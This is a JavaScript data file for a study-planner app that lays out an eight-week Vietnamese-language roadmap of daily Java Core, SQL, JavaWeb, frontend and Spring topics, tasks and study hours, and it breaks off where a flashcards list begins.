var _globalScope = typeof window !== 'undefined' ? window : (typeof global !== 'undefined' ? global : {});
_globalScope.APP_DATA = {
  "roadmap": [
    {
      "week": 1,
      "title": "TUẦN 1: Java Fundamentals + Syntax & Declarations",
      "badge": "Java Core Foundation",
      "color": "#3b82f6",
      "goal": "Xây nền tảng cực chắc về Primitive, Scope, Modifiers, Operators để từ tuần 2 bắt đầu cày đề.",
      "days": [
        {
          "day": 1,
          "title": "Chapter 1: Language Fundamentals (Phần 1)",
          "topics": [
            "Java Keywords & Identifiers",
            "Primitive types & byte/short/int/long/float/double/char/boolean ranges",
            "Literals (hex, octal, float suffix)",
            "Variable declarations & scopes",
            "Array declarations & initialization",
            "Default values of primitives vs object references",
            "main() method signature & command-line arguments"
          ],
          "tasks": [
            "Đọc kỹ Ch01.pdf",
            "Tự gõ code test: local variable uninitialized có compile được không?",
            "Tự test array default values (int[] a = new int[5])",
            "Làm 10 câu trắc nghiệm Ch1"
          ],
          "targetHours": {
            "java": 2,
            "other": 0.75,
            "testking": 0.75,
            "english": 0.5
          }
        },
        {
          "day": 2,
          "title": "Chapter 1: Language Fundamentals (Phần 2) + TestKing",
          "topics": [
            "Primitive vs Reference types",
            "Variable Initialization rules (Instance vs Static vs Local)",
            "Type Casting & implicit promotion",
            "Scope of variables (block, method, instance)"
          ],
          "tasks": [
            "Làm 20-30 câu TestKing về Primitive & Array",
            "Ghi chú vào Error Notebook: Vì sao local variable không có giá trị mặc định?",
            "Luyện 5 câu dịch Anh-Việt"
          ],
          "targetHours": {
            "java": 2,
            "other": 0.75,
            "testking": 0.75,
            "english": 0.5
          }
        },
        {
          "day": 3,
          "title": "Chapter 2: Declarations & Access Control (Phần 1)",
          "topics": [
            "Access Modifiers: public, protected, default (package-private), private",
            "Class declaration rules (public vs default class trong 1 file)",
            "Package statements & import rules"
          ],
          "tasks": [
            "Vẽ và điền bảng Access Modifiers Matrix cho Class/Package/Subclass/World",
            "Code thử kế thừa protected ở khác package để hiểu rõ protected"
          ],
          "targetHours": {
            "java": 2,
            "other": 0.75,
            "testking": 0.75,
            "english": 0.5
          }
        },
        {
          "day": 4,
          "title": "Chapter 2: Declarations & Access Control (Phần 2)",
          "topics": [
            "Non-access modifiers: static, final, abstract, strictfp, native",
            "Interface declaration: constants (public static final ngầm định), methods (public abstract ngầm định)",
            "Abstract class vs Interface rules"
          ],
          "tasks": [
            "Kiểm tra các bẫy: final abstract method có hợp lệ không?",
            "Interface variable có thể là private được không?",
            "Làm 25 câu TestKing Ch2"
          ],
          "targetHours": {
            "java": 2,
            "other": 0.75,
            "testking": 0.75,
            "english": 0.5
          }
        },
        {
          "day": 5,
          "title": "Chapter 3: Operators & Assignments",
          "topics": [
            "Operator Precedence & Associativity",
            "Prefix vs Postfix (++x vs x++)",
            "Short-circuit operators (&&, ||) vs Bitwise (&, |)",
            "Bitwise shift: <<, >> (signed), >>> (unsigned)",
            "Ternary operator ? :",
            "instanceof operator",
            "== vs equals() cơ bản"
          ],
          "tasks": [
            "Tính tay các biểu thức phức tạp: int x = 5; int y = x++ + ++x;",
            "Hiểu rõ vì sao (1 > 2 && ++x > 0) không làm tăng x",
            "Làm 30 câu TestKing Ch3"
          ],
          "targetHours": {
            "java": 2,
            "other": 0.75,
            "testking": 0.75,
            "english": 0.5
          }
        },
        {
          "day": 6,
          "title": "Luyện đề TestKing Chapter 1-3",
          "topics": [
            "Tổng hợp bẫy cú pháp Ch1, Ch2, Ch3",
            "Tư duy đọc code truy tìm Compile Error"
          ],
          "tasks": [
            "Làm 40-50 câu TestKing Ch1-3 không nhìn đáp án",
            "Chấm điểm và phân tích câu sai vào Error Book",
            "Luyện 5 câu dịch Comment Code"
          ],
          "targetHours": {
            "java": 2,
            "other": 0.75,
            "testking": 0.75,
            "english": 0.5
          }
        },
        {
          "day": 7,
          "title": "REVIEW DAY 1: Tổng kết & Lập Top 20 Lỗi Tuần 1",
          "topics": [
            "Ôn tập toàn diện Ch1, Ch2, Ch3",
            "Truy tìm lỗ hổng kiến thức"
          ],
          "tasks": [
            "Làm lại 20 câu Ch1, 20 câu Ch2, 20 câu Ch3",
            "Lập danh sách TOP 20 lỗi hay mắc",
            "Đánh giá tiến độ tuần 1"
          ],
          "targetHours": {
            "java": 2.5,
            "other": 0.5,
            "testking": 1,
            "english": 0.5
          }
        }
      ]
    },
    {
      "week": 2,
      "title": "TUẦN 2: Flow Control, Exceptions & OOP Core",
      "badge": "Crucial Week",
      "color": "#8b5cf6",
      "goal": "Nắm chắc luồng điều khiển, try-catch-finally bẫy kinh điển và 4 trụ cột OOP, Overloading vs Overriding.",
      "days": [
        {
          "day": 8,
          "title": "Chapter 4: Flow Control (if, switch, loops)",
          "topics": [
            "if / else (bẫy else treo)",
            "switch statement: kiểu dữ liệu hợp lệ (byte, short, char, int), bẫy fall-through khi thiếu break",
            "for, while, do-while loops",
            "break & continue có label vs không label"
          ],
          "tasks": [
            "Code tracing từng bước i, condition, statement",
            "Làm bài tập switch case thiếu break"
          ],
          "targetHours": {
            "java": 2,
            "other": 0.75,
            "testking": 0.75,
            "english": 0.5
          }
        },
        {
          "day": 9,
          "title": "Chapter 4: Exceptions & Assertions",
          "topics": [
            "Exception hierarchy: Throwable -> Error vs Exception (Checked vs Unchecked)",
            "try, catch, finally block execution order",
            "Bẫy: return trong try vs return trong finally",
            "throw vs throws",
            "Assertion syntax & ea flag"
          ],
          "tasks": [
            "Tự viết code: try { return 1; } finally { return 2; } xem trả về gì!",
            "Phân biệt catch (ChildException) trước hay ParentException trước"
          ],
          "targetHours": {
            "java": 2,
            "other": 0.75,
            "testking": 0.75,
            "english": 0.5
          }
        },
        {
          "day": 10,
          "title": "Chapter 5: OOP - Encapsulation & Inheritance",
          "topics": [
            "Encapsulation (getter/setter, data hiding)",
            "IS-A (kế thừa extends/implements) vs HAS-A (composition)",
            "Constructor rules: default constructor, super() và this() gọi ở dòng đầu tiên",
            "Constructor chaining"
          ],
          "tasks": [
            "Thử nghiệm: Class cha không có default constructor thì class con khai báo thế nào?",
            "Làm 20 câu Ch5 TestKing"
          ],
          "targetHours": {
            "java": 2,
            "other": 0.75,
            "testking": 0.75,
            "english": 0.5
          }
        },
        {
          "day": 11,
          "title": "Chapter 5: OOP - Polymorphism, Overloading vs Overriding",
          "topics": [
            "Polymorphism: Compile-time type vs Runtime object type",
            "Method Overloading: compile-time resolution, method signature (tên + tham số)",
            "Method Overriding rules: cùng tên, cùng tham số, return type tương thích, access modifier không được hẹp hơn, không được throw checked exception mới/rộng hơn"
          ],
          "tasks": [
            "Lập bảng so sánh chi tiết Overloading vs Overriding",
            "Tự vẽ sơ đồ polymorphic dispatch"
          ],
          "targetHours": {
            "java": 2,
            "other": 0.75,
            "testking": 0.75,
            "english": 0.5
          }
        },
        {
          "day": 12,
          "title": "Chapter 5: OOP - Advanced Concepts",
          "topics": [
            "Variable Shadowing & Method Hiding (static method)",
            "Casting objects: Upcasting vs Downcasting",
            "ClassCastException at runtime vs Compile error"
          ],
          "tasks": [
            "Phân biệt: override method vs hide static method",
            "Thực hành các câu hỏi casting đối tượng"
          ],
          "targetHours": {
            "java": 2,
            "other": 0.75,
            "testking": 0.75,
            "english": 0.5
          }
        },
        {
          "day": 13,
          "title": "Tổng hợp & Luyện đề Chapter 1-5",
          "topics": [
            "Tổng hợp kiến thức nền tảng từ Ch1 đến Ch5"
          ],
          "tasks": [
            "Làm 50 câu TestKing tổng hợp Ch1-5",
            "Ghi lại mọi bẫy OOP vào Error Notebook",
            "Luyện 5 câu Comment Code"
          ],
          "targetHours": {
            "java": 2,
            "other": 0.75,
            "testking": 0.75,
            "english": 0.5
          }
        },
        {
          "day": 14,
          "title": "Mini Mock Test #1 (20 câu Java Core)",
          "topics": [
            "Kiểm tra đánh giá mốc 2 tuần"
          ],
          "tasks": [
            "Làm bài thi thử 20 câu Java Core (30 phút)",
            "Đánh giá điểm: <12 học lại, 12-15 ổn, 16-17 khá, 18+ tốt",
            "Rà soát các câu sai"
          ],
          "targetHours": {
            "java": 2.5,
            "other": 0.5,
            "testking": 1,
            "english": 0.5
          }
        }
      ]
    },
    {
      "week": 3,
      "title": "TUẦN 3: String, Collections, Inner Classes & Threads",
      "badge": "High Value Topics",
      "color": "#06b6d4",
      "goal": "Làm chủ String Pool, Collections Framework (List/Set/Map), Inner classes và Multi-threading.",
      "days": [
        {
          "day": 15,
          "title": "Chapter 6: String, StringBuffer, Immutability",
          "topics": [
            "String immutability & String Constant Pool",
            "String s = new String(\"abc\") tạo bao nhiêu objects?",
            "== (tham chiếu) vs equals() (nội dung)",
            "StringBuffer & StringBuilder (mutable, thread-safety)",
            "String methods: concat, substring, replace, trim, length"
          ],
          "tasks": [
            "Viết code test các trường hợp String Pool với toán tử +",
            "Làm 20 câu String trong TestKing"
          ],
          "targetHours": {
            "java": 2,
            "other": 0.75,
            "testking": 0.75,
            "english": 0.5
          }
        },
        {
          "day": 16,
          "title": "Chapter 6: Wrapper Classes & Math",
          "topics": [
            "Wrapper classes: Integer, Double, Boolean...",
            "Autoboxing & Unboxing",
            "Integer Cache (-128 đến 127): Integer a = 100, b = 100 -> a == b?",
            "Math class methods: abs, ceil, floor, round, random"
          ],
          "tasks": [
            "Test bẫy Integer Cache",
            "Làm 20 câu Wrapper & Math"
          ],
          "targetHours": {
            "java": 2,
            "other": 0.75,
            "testking": 0.75,
            "english": 0.5
          }
        },
        {
          "day": 17,
          "title": "Chapter 7: Collections Framework (Phần 1)",
          "topics": [
            "Collection hierarchy: Collection vs Collections (utility)",
            "List interface: ArrayList, LinkedList, Vector",
            "Set interface: HashSet, LinkedHashSet, TreeSet",
            "Duplicate, Ordered, Sorted matrix"
          ],
          "tasks": [
            "Lập bảng ma trận so sánh List và Set",
            "Thực hành TreeSet và quy tắc phần tử phải implement Comparable"
          ],
          "targetHours": {
            "java": 2,
            "other": 0.75,
            "testking": 0.75,
            "english": 0.5
          }
        },
        {
          "day": 18,
          "title": "Chapter 7: Collections Framework (Phần 2) & equals/hashCode",
          "topics": [
            "Map interface: HashMap, Hashtable, TreeMap, LinkedHashMap (Map KHÔNG kế thừa Collection)",
            "equals() & hashCode() contract: tại sao phải override cả 2?",
            "Garbage Collection: System.gc(), finalize(), khi nào object eligible for GC?"
          ],
          "tasks": [
            "Vẽ cơ chế hoạt động của HashMap (bucket, hash, equals, collision)",
            "Làm 30 câu TestKing Ch7"
          ],
          "targetHours": {
            "java": 2,
            "other": 0.75,
            "testking": 0.75,
            "english": 0.5
          }
        },
        {
          "day": 19,
          "title": "Chapter 8: Inner Classes",
          "topics": [
            "Regular Inner Class (non-static)",
            "Method-Local Inner Class (truy cập biến local final/effectively final)",
            "Anonymous Inner Class",
            "Static Nested Class"
          ],
          "tasks": [
            "Cú pháp khởi tạo: Outer.Inner in = new Outer().new Inner();",
            "Làm 20 câu TestKing Inner classes"
          ],
          "targetHours": {
            "java": 2,
            "other": 0.75,
            "testking": 0.75,
            "english": 0.5
          }
        },
        {
          "day": 20,
          "title": "Chapter 9: Threads & Concurrency",
          "topics": [
            "Thread vs Runnable: start() vs run()",
            "Thread lifecycle: New, Runnable, Running, Blocked/Waiting, Terminated",
            "Thread methods: sleep(), yield(), join()",
            "Synchronization & Locks: synchronized method vs block",
            "Inter-thread communication: wait(), notify(), notifyAll() (phải gọi trong synchronized block)"
          ],
          "tasks": [
            "Tự viết ví dụ synchronized tránh race condition",
            "Làm 25 câu TestKing Threads"
          ],
          "targetHours": {
            "java": 2,
            "other": 0.75,
            "testking": 0.75,
            "english": 0.5
          }
        },
        {
          "day": 21,
          "title": "Java Core Mock Exam #1",
          "topics": [
            "Đánh giá toàn bộ 9 chương Java Core"
          ],
          "tasks": [
            "Làm đề thi thử 30 câu Java Core",
            "Thống kê tỷ lệ đúng theo từng Chapter (1-9) để tìm điểm yếu",
            "Ôn tập lại các câu sai"
          ],
          "targetHours": {
            "java": 2.5,
            "other": 0.5,
            "testking": 1,
            "english": 0.5
          }
        }
      ]
    },
    {
      "week": 4,
      "title": "TUẦN 4: SQL + JSP/Servlet + Củng cố Java",
      "badge": "Entry Test Alignment",
      "color": "#10b981",
      "goal": "Làm chủ SQL queries (JOINs, Subquery, GROUP BY) và luồng ứng dụng JavaWeb JSP/Servlet.",
      "days": [
        {
          "day": 22,
          "title": "SQL: DDL, DML & Basic Queries",
          "topics": [
            "SELECT, WHERE, ORDER BY (ASC/DESC)",
            "Operators: LIKE, BETWEEN, IN, IS NULL",
            "INSERT, UPDATE, DELETE vs TRUNCATE",
            "Primary Key vs Foreign Key constraints"
          ],
          "tasks": [
            "Luyện viết 15 câu query cơ bản",
            "Lập bảng phân biệt DELETE vs TRUNCATE vs DROP"
          ],
          "targetHours": {
            "java": 1,
            "other": 1.5,
            "testking": 0.75,
            "english": 0.75
          }
        },
        {
          "day": 23,
          "title": "SQL: Aggregation & GROUP BY / HAVING",
          "topics": [
            "Aggregate functions: COUNT(*), COUNT(col), SUM, AVG, MIN, MAX",
            "GROUP BY clause",
            "WHERE vs HAVING (WHERE lọc trước khi gom nhóm, HAVING lọc sau khi gom nhóm)"
          ],
          "tasks": [
            "Luyện viết 10 câu query GROUP BY kèm HAVING",
            "Tập trả lời phỏng vấn: WHERE khác HAVING điểm nào?"
          ],
          "targetHours": {
            "java": 1,
            "other": 1.5,
            "testking": 0.75,
            "english": 0.75
          }
        },
        {
          "day": 24,
          "title": "SQL: JOINs & Subqueries + Interview Prep",
          "topics": [
            "INNER JOIN vs LEFT JOIN vs RIGHT JOIN vs FULL OUTER JOIN",
            "Subquery (Single row, Multi row with IN/EXISTS/ANY/ALL)",
            "UNION vs UNION ALL"
          ],
          "tasks": [
            "Luyện 10 câu query JOIN phức tạp",
            "Luyện 7 câu SQL phỏng vấn trong roadmap (INNER vs LEFT, DELETE vs TRUNCATE...)"
          ],
          "targetHours": {
            "java": 1,
            "other": 1.5,
            "testking": 0.75,
            "english": 0.75
          }
        },
        {
          "day": 25,
          "title": "JavaWeb: Servlet Architecture & Lifecycle",
          "topics": [
            "Servlet Lifecycle: init(), service() -> doGet()/doPost(), destroy()",
            "HttpServletRequest & HttpServletResponse",
            "Web container / Tomcat role",
            "web.xml configuration vs @WebServlet annotation"
          ],
          "tasks": [
            "Vẽ sơ đồ vòng đời Servlet",
            "Hiểu rõ container tạo duy nhất 1 instance Servlet cho nhiều thread requests"
          ],
          "targetHours": {
            "java": 1,
            "other": 1.5,
            "testking": 0.75,
            "english": 0.75
          }
        },
        {
          "day": 26,
          "title": "JavaWeb: Scopes, Session & Cookies",
          "topics": [
            "4 Scopes: page, request, session, application (ServletContext)",
            "Session Tracking: HttpSession (setAttribute, getAttribute)",
            "Cookies vs Session",
            "URL Rewriting"
          ],
          "tasks": [
            "Lập bảng so sánh 4 phạm vi lưu trữ (Scopes)",
            "Giải thích cơ chế Cookie session JSESSIONID"
          ],
          "targetHours": {
            "java": 1,
            "other": 1.5,
            "testking": 0.75,
            "english": 0.75
          }
        },
        {
          "day": 27,
          "title": "JavaWeb: JSP, JSTL, Filter & RequestDispatcher",
          "topics": [
            "RequestDispatcher.forward() vs HttpServletResponse.sendRedirect()",
            "JSP syntax: scriptlet, expression, directive",
            "EL (Expression Language) & JSTL core tags (c:if, c:forEach)",
            "Filter lifecycle (doFilter, chain.doFilter) & Listener"
          ],
          "tasks": [
            "Lập bảng so sánh chi tiết Forward vs Redirect (URL thay đổi không? request giữ nguyên không?)",
            "Vẽ sơ đồ flow Browser -> Servlet -> DAO -> DB -> JSP -> Browser"
          ],
          "targetHours": {
            "java": 1,
            "other": 1.5,
            "testking": 0.75,
            "english": 0.75
          }
        },
        {
          "day": 28,
          "title": "Full Mock Entry Test #1 (Java + SQL + Web)",
          "topics": [
            "Thi thử format chuẩn Entry Test"
          ],
          "tasks": [
            "Làm đề thi thử 25 câu: 15 Java Core, 5 SQL, 5 JavaWeb",
            "Bấm giờ 40 phút",
            "Đánh giá điểm từng phần và lưu kết quả"
          ],
          "targetHours": {
            "java": 1.5,
            "other": 1,
            "testking": 1,
            "english": 0.5
          }
        }
      ]
    },
    {
      "week": 5,
      "title": "TUẦN 5: Cày Đề TestKing Toàn Diện + Error Notebook",
      "badge": "High Intensity",
      "color": "#f59e0b",
      "goal": "Quét sạch 294 câu TestKing lần 1, phát hiện mọi lỗ hổng và hoàn thiện sổ tay bắt lỗi.",
      "days": [
        {
          "day": 29,
          "title": "TestKing Marathon Part 1 (Câu 1 - 40)",
          "topics": [
            "Language Fundamentals, Operators, Arrays",
            "Quy trình: Làm câu -> Chọn đáp án -> Tự giải thích -> Kiểm tra -> Nếu sai viết ví dụ phản chứng"
          ],
          "tasks": [
            "Hoàn thành 40 câu TestKing đầu tiên",
            "Ghi chú ít nhất 5 bẫy vào Error Notebook"
          ],
          "targetHours": {
            "java": 1,
            "other": 0.5,
            "testking": 2,
            "english": 0.5
          }
        },
        {
          "day": 30,
          "title": "TestKing Marathon Part 2 (Câu 41 - 80)",
          "topics": [
            "Declarations, Access modifiers, Abstract classes, Interfaces"
          ],
          "tasks": [
            "Hoàn thành 40 câu TestKing tiếp theo",
            "Review lại bảng Access modifiers"
          ],
          "targetHours": {
            "java": 1,
            "other": 0.5,
            "testking": 2,
            "english": 0.5
          }
        },
        {
          "day": 31,
          "title": "Chuẩn hóa Java Error Notebook",
          "topics": [
            "Phân loại 8 mục: 1. Syntax trap, 2. Compile error, 3. Runtime exception, 4. OOP trap, 5. String trap, 6. Collection trap, 7. Thread trap, 8. Operator trap"
          ],
          "tasks": [
            "Tổng hợp và biên tập lại toàn bộ lỗi sai từ đầu tới giờ",
            "Làm 20 câu TestKing review"
          ],
          "targetHours": {
            "java": 1.5,
            "other": 0.5,
            "testking": 1.5,
            "english": 0.5
          }
        },
        {
          "day": 32,
          "title": "TestKing Marathon Part 3 (Câu 81 - 130)",
          "topics": [
            "Flow control, Loops, Exceptions try-catch-finally"
          ],
          "tasks": [
            "Hoàn thành 50 câu TestKing",
            "Luyện tập code tracing các bài loop phức tạp"
          ],
          "targetHours": {
            "java": 1,
            "other": 0.5,
            "testking": 2,
            "english": 0.5
          }
        },
        {
          "day": 33,
          "title": "TestKing Marathon Part 4 (Câu 131 - 180)",
          "topics": [
            "OOP, Inheritance, Polymorphism, Overriding"
          ],
          "tasks": [
            "Hoàn thành 50 câu TestKing",
            "Chú ý bẫy covariant return types và static method hiding"
          ],
          "targetHours": {
            "java": 1,
            "other": 0.5,
            "testking": 2,
            "english": 0.5
          }
        },
        {
          "day": 34,
          "title": "TestKing Marathon Part 5 (Câu 181 - 240)",
          "topics": [
            "String, Wrapper, Math, Collections, Generics"
          ],
          "tasks": [
            "Hoàn thành 60 câu TestKing",
            "Ghi chú các câu về equals/hashCode và TreeSet ordering"
          ],
          "targetHours": {
            "java": 1,
            "other": 0.5,
            "testking": 2,
            "english": 0.5
          }
        },
        {
          "day": 35,
          "title": "TestKing Marathon Part 6 (Câu 241 - 294) + Mock Mid-term",
          "topics": [
            "Inner Classes & Threads, Hoàn tất vòng 1 TestKing 294 câu"
          ],
          "tasks": [
            "Hoàn thành 54 câu cuối cùng",
            "Làm đề thi thử 20 câu tổng hợp (Java/SQL/Web)"
          ],
          "targetHours": {
            "java": 1,
            "other": 0.5,
            "testking": 2,
            "english": 0.5
          }
        }
      ]
    },
    {
      "week": 6,
      "title": "TUẦN 6: FEE + Spring Core & Audit 1-1 Prep",
      "badge": "Audit Focus",
      "color": "#ec4899",
      "goal": "Chuẩn bị hoàn hảo cho buổi phỏng vấn Audit 1-1: Frontend Essentials, Spring Framework và phản xạ trả lời câu hỏi kỹ thuật.",
      "days": [
        {
          "day": 36,
          "title": "Frontend Essentials: HTML5 & CSS3",
          "topics": [
            "HTML Semantic tags (form, input, table, div, span)",
            "CSS Box Model (content, padding, border, margin)",
            "display: block, inline, inline-block, flex, none",
            "display: none vs visibility: hidden",
            "CSS positioning: static, relative, absolute, fixed"
          ],
          "tasks": [
            "Luyện trả lời câu hỏi Audit: Box Model là gì? display:none khác visibility:hidden thế nào?",
            "Code giao diện form đăng nhập đơn giản"
          ],
          "targetHours": {
            "java": 1,
            "other": 1.5,
            "testking": 0.75,
            "english": 0.75
          }
        },
        {
          "day": 37,
          "title": "Frontend Essentials: JavaScript Core",
          "topics": [
            "var vs let vs const (hoisting, block scope)",
            "Data types, primitive vs object",
            "DOM manipulation & Event Handling (addEventListener, event bubbling)",
            "AJAX & Fetch API basics, JSON parse/stringify",
            "Closure concept cơ bản"
          ],
          "tasks": [
            "Luyện trả lời phỏng vấn: JS chạy ở đâu? DOM là gì? AJAX dùng làm gì? let khác var thế nào?"
          ],
          "targetHours": {
            "java": 1,
            "other": 1.5,
            "testking": 0.75,
            "english": 0.75
          }
        },
        {
          "day": 38,
          "title": "Frontend Essentials: jQuery & Bootstrap",
          "topics": [
            "jQuery: $ selector, event methods (.click(), .change()), DOM traversal, .val(), .ajax()",
            "Bootstrap: Grid system (container, row, col-12, col-md-6), responsive breakpoints, components (modal, table, form)"
          ],
          "tasks": [
            "Hiểu nguyên lý lưới 12 cột Bootstrap",
            "Làm 10 câu flashcard FEE"
          ],
          "targetHours": {
            "java": 1,
            "other": 1.5,
            "testking": 0.75,
            "english": 0.75
          }
        },
        {
          "day": 39,
          "title": "Spring Framework: IoC, DI & Bean Lifecycle",
          "topics": [
            "Inversion of Control (IoC) & Dependency Injection (DI) là gì?",
            "Spring ApplicationContext & BeanFactory",
            "Spring Bean Scopes (singleton, prototype)",
            "@Component, @Service, @Repository, @Controller, @RestController",
            "@Autowired (field, setter, constructor injection)"
          ],
          "tasks": [
            "Tập giải thích IoC/DI bằng lời kèm ví dụ thực tế",
            "Vì sao Constructor Injection được khuyến nghị hơn Field Injection?"
          ],
          "targetHours": {
            "java": 1,
            "other": 1.5,
            "testking": 0.75,
            "english": 0.75
          }
        },
        {
          "day": 40,
          "title": "Spring MVC & Spring Boot Basics",
          "topics": [
            "Spring MVC Flow: DispatcherServlet -> HandlerMapping -> Controller -> ViewResolver",
            "@RequestMapping, @GetMapping, @PostMapping",
            "@PathVariable vs @RequestParam vs @RequestBody",
            "Spring Boot: Starter dependencies, auto-configuration, application.properties"
          ],
          "tasks": [
            "Vẽ luồng xử lý request trong Spring MVC",
            "Luyện tập trả lời các câu hỏi Audit về Spring"
          ],
          "targetHours": {
            "java": 1,
            "other": 1.5,
            "testking": 0.75,
            "english": 0.75
          }
        },
        {
          "day": 41,
          "title": "Bổ sung Java 8-17 Features (OCA/OCP Alignment)",
          "topics": [
            "Java 8: Lambda expressions, Functional Interfaces (@FunctionalInterface), Stream API (filter, map, collect), Optional class",
            "Interface default & static methods",
            "Java 11: var keyword (local-variable type inference)",
            "Java 17: Record classes, Sealed classes cơ bản"
          ],
          "tasks": [
            "Viết ví dụ Stream API tính tổng hoặc lọc danh sách",
            "Làm 15 câu trắc nghiệm Java 8"
          ],
          "targetHours": {
            "java": 1.5,
            "other": 1,
            "testking": 0.75,
            "english": 0.75
          }
        },
        {
          "day": 42,
          "title": "Audit 1-1 Simulation Session #1",
          "topics": [
            "Mô phỏng phỏng vấn vấn đáp 1-1 với 10 câu hỏi cốt lõi"
          ],
          "tasks": [
            "Sử dụng tính năng Ghi âm trong Audit Simulator để tự nói thành tiếng (60-90 giây/câu)",
            "Nghe lại ghi âm và rà soát thuật ngữ tiếng Anh/tiếng Việt"
          ],
          "targetHours": {
            "java": 1,
            "other": 2,
            "testking": 0.5,
            "english": 0.5
          }
        }
      ]
    },
    {
      "week": 7,
      "title": "TUẦN 7: Luyện Đề Tốc Độ Cao & Mock Test Lặp Lại",
      "badge": "Exam Simulation",
      "color": "#ef4444",
      "goal": "Làm TestKing vòng 2 với độ chính xác >90%, phản xạ nhận diện câu gài dưới 45 giây.",
      "days": [
        {
          "day": 43,
          "title": "TestKing Lần 2 - Đợt 1 (50 câu)",
          "topics": [
            "Tốc độ & phản xạ: mục tiêu < 60s/câu, không nhìn đáp án"
          ],
          "tasks": [
            "Làm 50 câu TestKing",
            "Đánh dấu các câu làm sai hoặc mất quá nhiều thời gian"
          ],
          "targetHours": {
            "java": 0.5,
            "other": 0.5,
            "testking": 2.5,
            "english": 0.5
          }
        },
        {
          "day": 44,
          "title": "TestKing Lần 2 - Đợt 2 (50 câu)",
          "topics": [
            "Tập trung vào câu hỏi Exception & Flow control"
          ],
          "tasks": [
            "Làm 50 câu TestKing",
            "Soát lại bảng Exception Hierarchy"
          ],
          "targetHours": {
            "java": 0.5,
            "other": 0.5,
            "testking": 2.5,
            "english": 0.5
          }
        },
        {
          "day": 45,
          "title": "TestKing Lần 2 - Đợt 3 (50 câu)",
          "topics": [
            "Tập trung vào câu hỏi OOP Polymorphism & Inheritance"
          ],
          "tasks": [
            "Làm 50 câu TestKing",
            "Củng cố quy tắc method overriding"
          ],
          "targetHours": {
            "java": 0.5,
            "other": 0.5,
            "testking": 2.5,
            "english": 0.5
          }
        },
        {
          "day": 46,
          "title": "TestKing Lần 2 - Đợt 4 (50 câu)",
          "topics": [
            "Tập trung vào Collections, Threads & Inner classes"
          ],
          "tasks": [
            "Làm 50 câu TestKing",
            "Kiểm tra độ nhớ về wait/notify monitor locks"
          ],
          "targetHours": {
            "java": 0.5,
            "other": 0.5,
            "testking": 2.5,
            "english": 0.5
          }
        },
        {
          "day": 47,
          "title": "Diệt Cỏ Câu Sai (Nhóm sai >= 2 lần)",
          "topics": [
            "Lọc toàn bộ những câu đã sai ở vòng 1 hoặc vòng 2"
          ],
          "tasks": [
            "Làm lại từng câu sai kèm giải thích tại sao đáp án đó đúng",
            "Cam kết không sai lại lần 3"
          ],
          "targetHours": {
            "java": 1,
            "other": 0.5,
            "testking": 2,
            "english": 0.5
          }
        },
        {
          "day": 48,
          "title": "Full Mock Entry Test #2 (Nghiêm ngặt)",
          "topics": [
            "Đề thi tổng hợp đầy đủ như thi thật"
          ],
          "tasks": [
            "Bấm giờ đúng 45 phút cho 30 câu (Java + SQL + Web)",
            "Không tra cứu, không AI",
            "Tính điểm và phân tích lỗ hổng"
          ],
          "targetHours": {
            "java": 1.5,
            "other": 1,
            "testking": 1,
            "english": 0.5
          }
        },
        {
          "day": 49,
          "title": "Audit 1-1 Simulation Session #2",
          "topics": [
            "Phỏng vấn thử lần 2 với các câu hỏi khó"
          ],
          "tasks": [
            "Ghi âm câu trả lời cho các chủ đề: HashMap hashing, Servlet lifecycle, Spring IoC, SQL JOINs vs Subquery",
            "Nghe lại và sửa lỗi nói lan man"
          ],
          "targetHours": {
            "java": 1,
            "other": 1.5,
            "testking": 1,
            "english": 0.5
          }
        }
      ]
    },
    {
      "week": 8,
      "title": "TUẦN 8: Final Review & Sẵn Sàng Chinh Phục",
      "badge": "Victory Week",
      "color": "#14b8a6",
      "goal": "Không nhồi nhét kiến thức mới. Rà soát Error Book, luyện flashcards phản xạ nhanh và giữ tâm lý tự tin vững vàng.",
      "days": [
        {
          "day": 50,
          "title": "Rà soát Java Core Ch1, Ch2, Ch3",
          "topics": [
            "Primitives, Modifiers, Operators traps"
          ],
          "tasks": [
            "Đọc lại toàn bộ thẻ Flashcards Ch1-3",
            "Làm nhanh 20 câu trắc nghiệm phản xạ"
          ],
          "targetHours": {
            "java": 2,
            "other": 0.5,
            "testking": 1,
            "english": 0.5
          }
        },
        {
          "day": 51,
          "title": "Rà soát Java Core Ch4, Ch5",
          "topics": [
            "Flow control, Exceptions bẫy return finally, OOP rules"
          ],
          "tasks": [
            "Đọc lại flashcards Ch4-5",
            "Làm nhanh 20 câu trắc nghiệm"
          ],
          "targetHours": {
            "java": 2,
            "other": 0.5,
            "testking": 1,
            "english": 0.5
          }
        },
        {
          "day": 52,
          "title": "Rà soát Java Core Ch6, Ch7",
          "topics": [
            "String Pool, equals vs ==, Collections, Map"
          ],
          "tasks": [
            "Đọc lại flashcards Ch6-7",
            "Làm nhanh 20 câu trắc nghiệm"
          ],
          "targetHours": {
            "java": 2,
            "other": 0.5,
            "testking": 1,
            "english": 0.5
          }
        },
        {
          "day": 53,
          "title": "Rà soát Java Core Ch8, Ch9",
          "topics": [
            "Inner classes, Thread states, synchronized"
          ],
          "tasks": [
            "Đọc lại flashcards Ch8-9",
            "Làm nhanh 20 câu trắc nghiệm"
          ],
          "targetHours": {
            "java": 2,
            "other": 0.5,
            "testking": 1,
            "english": 0.5
          }
        },
        {
          "day": 54,
          "title": "Rà soát SQL & JavaWeb",
          "topics": [
            "SQL JOINs, GROUP BY/HAVING, Servlet lifecycle, Scopes, Forward vs Redirect"
          ],
          "tasks": [
            "Luyện 15 câu SQL + 15 câu Web",
            "Rà soát bảng so sánh"
          ],
          "targetHours": {
            "java": 0.5,
            "other": 2,
            "testking": 1,
            "english": 0.5
          }
        },
        {
          "day": 55,
          "title": "Rà soát FEE, Spring & English Comment Code",
          "topics": [
            "Box model, JS let/const, Spring IoC/DI, 79 câu Comment Code"
          ],
          "tasks": [
            "Chạy qua toàn bộ 79 câu Comment Code Anh-Việt",
            "Tập nói lại 5 câu trả lời Spring Audit"
          ],
          "targetHours": {
            "java": 0.5,
            "other": 2,
            "testking": 0.5,
            "english": 1
          }
        },
        {
          "day": 56,
          "title": "GRAND FINALE: Full Mock Exam & Tự Tin Đi Thi",
          "topics": [
            "Tổng kết lộ trình 8 tuần"
          ],
          "tasks": [
            "Làm bài Final Mock Exam (30 câu đầy đủ mọi mảng)",
            "Đọc lại Error Book lần cuối",
            "Nghỉ ngơi, ngủ sớm, chuẩn bị tinh thần chiến thắng!"
          ],
          "targetHours": {
            "java": 1,
            "other": 1,
            "testking": 1,
            "english": 0.5
          }
        }
      ]
    }
  ],
  "flashcards": [
    {
      "id": "fc_j1_1",
